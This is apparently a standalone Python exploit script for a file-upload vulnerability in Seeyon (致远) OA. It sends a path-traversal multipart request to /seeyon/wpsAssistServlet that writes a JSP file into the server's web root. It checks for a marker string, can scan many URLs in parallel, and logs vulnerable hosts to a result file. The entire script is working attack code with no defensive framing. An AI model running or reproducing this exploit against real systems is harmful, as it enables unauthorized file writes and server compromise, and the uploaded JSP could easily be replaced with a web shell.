import requests, argparse, sys
from multiprocessing.dummy import Pool
def banner():
    test = """致远oa"""
    print(test)
def poc(url):
    target_url = url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
    headers = {"Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"}
    data = """--59229605f98b8cf290a7b8908b34616b
    Content-Disposition: form-data; name="upload"; filename="123.xls"
    Content-Type: application/vnd.ms-excel
    <% out.println("seeyon_vuln");%>
    --59229605f98b8cf290a7b8908b34616b--
    """
    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        if response.status_code == 200 and "seeyon_vuln" in response.text:
            print(f"[+]{url}存在文件上传漏洞.")
            with open("致远_result.txt", "a") as f:
                f.write(f"{url}存在文件上传漏洞.\n")
        else:
            print(f"[-]{url}不存在文件上传漏洞.")
    except requests.exceptions.RequestException as e:
        print(f"{url}可能存在文件上传漏洞请手工测试{e}")
def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OA文件上传漏洞脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter URL")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file containing URLs")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [line.strip() for line in f.readlines()]
        with Pool(10) as pool:
            pool.map(poc, url_list)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> OR -f <file>")
if __name__ == "__main__":
    main()
